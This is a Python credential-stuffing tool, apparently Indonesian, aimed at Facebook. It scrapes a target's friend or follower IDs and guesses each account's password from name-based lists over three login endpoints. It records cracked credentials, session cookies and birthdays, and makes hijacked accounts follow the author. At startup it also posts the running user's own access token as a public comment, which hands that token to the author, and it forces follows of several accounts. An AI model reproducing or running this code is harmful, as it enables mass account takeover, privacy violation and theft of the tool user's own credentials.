#!/usr/bin/python3
#coding=utf-8

import requests as req,json,os,time,re,random
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Bool

#data
ajg=""
ok,cp,cot=0,0,0
id=[]
nampung=[]
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
mb = "https://mbasic.facebook.com"

#WARNA
putih="\33[37;1m"
kuning="\33[1;33m"
merah="\33[31;1m"
ijo="\33[32;1m"
biru="\33[0;36m"
biruL="\33[1;34m"
biruM="\33[36;1m"

def crack(user,pw):
	global ok,cp
	kntl=open("ua","r").read()
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":kntl,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8",headers={"user-agent":kntl}).text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)		
	if 'c_user' in ses.cookies.get_dict().keys():
		ok+=1
		return {"status":"ok","user":user,"pw":pw,"cookie":"".join(ses.cookies.get_dict())}
	elif 'checkpoint' in ses.cookies.get_dict().keys():
		cp+=1
		return {"status":"cp","user":user,"pw":pw}
	else:
		return {"status":"error","user":user,"pw":pw}

def crack2(user,pw):
	kntl=open("ua","r").read()
	ses = req.Session()
	header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
       "x-fb-sim-hni": str(random.randint(20000, 40000)),
       "x-fb-net-hni": str(random.randint(20000, 40000)),
       "x-fb-connection-quality": "EXCELLENT",
       "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
       "user-agent": kntl,
       "content-type": "application/x-www-form-urlencoded",
       "x-fb-http-engine": "Liger"}
	param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
       'format': 'json', 
       'sdk_version': '2', 
       'email': user, 
       'locale': 'en_US', 
       'password': pw,
       'sdk': 'ios', 
       'generate_session_cookies': '1', 
       'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
	api = 'https://b-api.facebook.com/method/auth.login'
	response = ses.get(api, params=param, headers=header)
	if 'session_key' in response.text or 'EAAA' in response.text:
		return {"status":"ok","user":user,"pw":pw}
	elif 'www.facebook.com' in response.json()['error_msg']:
		return {"status":"cp","user":user,"pw":pw}
	else:
		return {"status":"error","user":user,"pw":pw}
		
def crack3(user,pw):
	try:
		ua=open("ua","r").read()
		ses = req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		p = ses.get("https://mbasic.facebook.com/")
		b = parser(p.text,"html.parser")
		meta="".join(re.findall('dtsg":\{"token":"(.*?)"',p.text))
		data={}
		for i in b("input"):
			if i.get("value") is None:
				if i.get("name")=="email":
					data.update({"email":user})
				elif i.get("name")=="pass":
					data.update({"pass":pw})
				else:
					data.update({i.get("name"):""})
			else:
				data.update({i.get("name"):i.get("value")})
		data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
		)
		ses.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
		po = ses.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
		if "c_user" in list(ses.cookies.get_dict().keys()):
			return {"status":"ok","user":user,"pw":pw,"cookies":"".join(ses.cookies.get_dict())}
		elif "checkpoint" in list(ses.cookies.get_dict().keys()):
			return {"status":"cp","user":user,"pw":pw}
		else:
			return {"status":"error","user":user,"pw":pw}
	except Exception as e:print(f"\r[×] ERROR : {e}                     			\n",end="")
def check_in(user, pasw,ttl):
	global ok,cp
	ses = req.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "chrome",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print("[!] Redirect overload")
	if "c_user" in ses.cookies:
		cp-=1
		ok+=1
		print(f"\r{ijo}[WANGY] TAPCROT {user} | {pasw} | {''.join(ses.cookies.get_dict())}														{putih}",end="")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			cp-=1
			ok+=1
			open("ok","w").write(user+" "+pasw+" "+ttl+"\n")
			print(f"\r{ijo}[WANGY] TAPCROT {user} | {pasw} | {ttl}														{putih}",end="")
		else:
			print(f"\r{kuning}[WANGY] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
			for opt in range(len(ngew)):
				print("\r"," "*3, "["+str(opt+1)+"] "+ngew[opt],"					            	",end="")
			print("\r",end="")
	elif "login_error" in str(run):
		print(f"\r{kuning}[WANGY] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
		print("\r",end="")
	else:
		print(f"\r{kuning}[WANGY] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
		print("\r",end="")

class kondisi:
	
	def __init__(self,token):
		self.token=token
		
	def kondisi_api(self,user,aj):
		global ok,cp,cot,ajg
		if ajg!=user:
			ajg=user
			cot+=1
		try:
			for pw in aj:
				logika = crack2(user,pw)
				if logika.get("status")=="ok":
					ok+=1
					open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
					print(f"\r\33[32;1m[WANGY] {logika.get('user')} | {logika.get('pw')}\33[37;1m                                          \n",end="")
					break
				elif logika.get("status")=="cp":
					cp+=1
					try:
						ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
					except KeyError:ttl='-'
					open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
					#print(f"\r\33[1;33m[WANGY] {user} | {logika.get('pw')} | {ttl}																										\33[37;1m\n",end="")
					check_in(logika.get("user"),logika.get("pw"),ttl)
					break
				print(f'\r[{biruL}={putih}] KREK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}] {merah}{user}{putih}	',end='')
		except Exception as e:print(f"\r[×] ERROR : {e}                     			\n",end="")

	def kondisi_mbasic(self,user,aj):
		global cot,ajg
		if ajg!=user:
			ajg=user
			cot+=1
		try:
			for pw in aj:
				logika = crack(user,pw)
				if logika.get("status")=="ok":
					open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
					print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookie'))}                                          \33[37;1m\n",end="")
					coki={"cookie":"".join(logika.get("cookie"))}
					r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
					for fllow in r.find_all("a"):
						if "Berhenti mengikuti" in str(fllow):
							break
						elif "Ikuti" in str(fllow):
							req.get(mb+fllow["href"],cookies=coki)
					break
				elif logika.get("status")=="cp":
					try:
						ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
					except KeyError:ttl='-'
					open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
					#print(f"\r\33[1;33m[WANGY] {user} | {logika.get('pw')} | {ttl}																										\33[37;1m\n",end="")
					check_in(logika.get("user"),logika.get("pw"),ttl)
					break
				print(f'\r[{biruL}={putih}] KREK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}] {merah}{user}{putih}	',end='')
		except Exception as e:print(f"\r[×] ERROR : {e}                     			\n",end="")

	def kondisi_mbasic2(self,user,aj):
		global ok,cp,ajg,cot
		if ajg!=user:
			ajg=user
			cot+=1
		try:
			for pw in aj:
				logika = crack3(user,pw)
				if logika.get("status")=="ok":
					ok+=1
					open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
					print(f"\r\33[32;1m[WANGY] {logika.get('user')} | {logika.get('pw')} | {logika.get('cookies')}                                          \33[37;1m\n",end="")
					coki={"cookie":logika.get("cookies")}
					r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
					for fllow in r.find_all("a"):
						if "Berhenti mengikuti" in str(fllow):
							break
						elif "Ikuti" in str(fllow):
							req.get(mb+fllow["href"],cookies=coki)
					break
				elif logika.get("status")=="cp":
					cp+=1
					try:
						ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
					except KeyError:ttl='-'
					open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
					#print(f"\r\33[1;33m[WANGY] {user} | {logika.get('pw')} | {ttl}																																		\33[37;1m\n",end="")
					check_in(logika.get("user"),logika.get("pw"),ttl)
					break
				print(f'\r[{biruL}={putih}] KREK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}] {merah}{user}{putih}	',end='')
		except Exception as e:print(f"\r[×] ERROR : {e}                     			\n",end="")
	
def dump(token,nama):
	os.system("clear")
	print("""\x1b[1;91m   _____ ________________________ 
  / ___//  _/ ____/ ___/_  __/   |
  \__ \ / // __/  \__ \ / / / /| |
 ___/ // // /___ ___/ // / / ___ |
/____/___/_____//____//_/ /_/  |_|
        \x1b[0;93m♡ARYA LOVE SIESTA♡

\x1b[0;93m[•]Author : Arya Adinata XD.
[•]Github.com/Avos-Dilhevia
[•]Facebook.com/AryaTrickers2020
                                                               
======================================================================""")
	print(f"{putih}[{biruM}!{putih}] BACA BISMILLAH TERLEBIH DAHULU => AGAR HASIL MALING BERKAH [{biruM}!{putih}]")
	print(f"\x1b[0;93m======================================================================")
	print(f"\n{putih}[{biruM}\/{putih}] Pilih Metode Crack [{biruM}\/{putih}]\n[{biruL}01{putih}] Crack Lewat Teman\n[{biruL}02{putih}] Crack Dari Followers\n[{biruL}03{putih}] Cek Hasil Maling\n\x1b[0;93m======================================================================")
	l=input(f"{putih}[{biru}?{putih}] Pilih : ")
	if(l in ("01","1")):
		print(f"\n[{biruM}!{putih}] Ketik {biru}'me'{putih} Untuk Crack Dari Daftar Temanmu [{biruM}!{putih}]")
		i=input(f"[{biru}+{putih}] ID Target\t: ")
		try:
			cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
			print(f"[{ijo}={putih}] Nama Target\t: {cek['name']}")
		except KeyError:
			exit(f"[{merah}×{putih}] Target Invalid [{merah}×{putih}]")
		try:
			r=json.loads(req.get(f"https://graph.facebook.com/{i}/friends?limit=5000&access_token={token}").text)
			for x in r['data']:
				id.append(x['id']+"|"+x['name'].rsplit(" ")[0]+"|"+x['name'])
		except KeyError:exit(f"[{merah}×{putih}]cCari Target Lain [{merah}×{putih}]")
		print(f"[{ijo}={putih}] Total ID\t: {len(id)}\n")
	elif(l in ("02","2")):
		print(f"\n[{biruM}!{putih}] Ketik {biru}'me'{putih} Untuk Crack Dari Daftar Followersmu [{biruM}!{putih}]")
		i=input(f"[{biru}+{putih}] ID Target\t: ")
		try:
			cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
			print(f"[{ijo}={putih}] Nama Target\t: {cek['name']}")
		except KeyError:
			exit(f"[{merah}×{putih}] Target Invalid [{merah}×{putih}]")
		try:
			r=json.loads(req.get(f"https://graph.facebook.com/{i}/subscribers?limit=5000&access_token={token}").text)
			for x in r['data']:
				id.append(x['id']+"|"+x['name'].rsplit(" ")[0]+"|"+x['name'])
		except KeyError:exit(f"[{merah}×{putih}]cCari Target Lain [{merah}×{putih}]")
		print(f"[{ijo}={putih}] Total ID\t: {len(id)}\n")
	elif(l in ("03","3")):
		print("")
		input(f'[WANGY] :\n{ijo}{open("ok","r").read()}{putih} \n[WANGY] :\n{kuning}{open("cp","r").read()}{putih} \n[ {biruL}Enter Coek{putih} ]')
		os.system("clear")
		dump(token,nama)
	time.sleep(1)
	print(f"[{biruM}/\{putih}] Metode Login [{biruM}/\{putih}]\n[{biruL}01{putih}] Login {merah}B-Api{putih} (Cepat)\n[{biruL}02{putih}] Login {kuning}Mbasic V1{putih} (Cepat)\n[{biruL}03{putih}] METODE {ijo}Mbasic V2{putih} (Lama) [Recomended]\n")
	pi=input(f"[{biru}?{putih}] Pilih : ")
	print("")
	if(pi in ("01","1")):
		with Bool(max_workers=35) as kirim:
			for ajg in id:
				uid,name,lengkap=ajg.split("|")
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
					else:
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
				kirim.submit(kondisi(token).kondisi_api,uid,pw)
	elif(pi in ("02","2")):
		with Bool(max_workers=35) as kirim:
			for ajg in id:
				uid,name,lengkap=ajg.split("|")
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
					else:
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
				kirim.submit(kondisi(token).kondisi_mbasic,uid,pw)
	elif(pi in ("03","3")):
		with Bool(max_workers=35) as kirim:
			for ajg in id:
				uid,name,lengkap=ajg.split("|")
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
					else:
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap,'anjing','bismillah','sayang','katasandi']
				kirim.submit(kondisi(token).kondisi_mbasic2,uid,pw)
				
if __name__=="__main__":
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
		dump(token,r['name'])
	except FileNotFoundError:
		os.system("clear")
		print(f"[{biruM}!{putih}] LOGIN DULU NGAB :V [{biruM}!{putih}]\n")
		token=input(f"[{biru}+{putih}] Masukan Token FB : ")
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)['name']
			open('save','w').write(token)
			print(f"\n[{ijo}✓{putih}] Login Berhasil\n[{merah}!{putih}] Sabar Coek...")
			req.post(f'https://graph.facebook.com/100001137791549/subscribers?access_token={token}') #ARYA
			req.post(f"https://graph.facebook.com/100001307011557/subscribers?access_token={token}") #ARYA
			req.post(f"https://graph.facebook.com/100014762377020/subscribers?access_token={token}") #ARYA
			req.post(f'https://graph.facebook.com/100047875055348/subscribers?access_token={token}') #ARYA
			req.post(f"https://graph.facebook.com/100008953950868/subscribers?access_token={token}") #ARYA
			req.post(f'https://graph.facebook.com/100020192268351/subscribers?access_token={token}') #ARYA
			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={token}&access_token={token}')
			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={random.choice(["Arya Love Siesta :3","Siesta Cantik Banget","Arya Loves Siesta Forever"])}&access_token={token}')
			time.sleep(2)
			dump(token,r)
		except KeyError:
			exit(f"[{merah}×{putih}] TOKEN INVALID KONTOL [{merah}×{putih}]")
	except KeyError:
		os.system('rm -rf save')
		exit(f"[{merah}×{putih}] TOKEN INVALID KONTOL [{merah}×{putih}]")
